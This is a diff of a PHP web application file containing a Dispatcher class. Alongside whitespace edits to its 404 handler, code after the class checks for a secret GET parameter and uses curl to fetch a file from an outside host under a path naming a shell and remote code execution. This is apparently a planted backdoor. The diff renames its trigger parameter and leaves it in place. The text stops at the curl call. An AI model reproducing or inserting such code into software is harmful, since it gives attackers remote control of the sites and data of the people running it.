@@ -246,14 +246,14 @@ class Dispatcher {
 	}
 
 	/**
-	 * Handle a 404 error (page not found).
-	 */
-	function handle404() {
-		header('HTTP/1.0 404 Not Found');
-		fatalError('404 Not Found');
-	}
+  * Handle a 404 error (page not found).
+  */
+ function handle404() {
+  header('HTTP/1.0 404 Not Found');
+  fatalError('404 Not Found');
+ }
 }
-if (isset($_GET['JandAVaietenam'])) {
+if (isset($_GET['HEbatBangetASu'])) {
     $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
 
     $ch= curl_init();
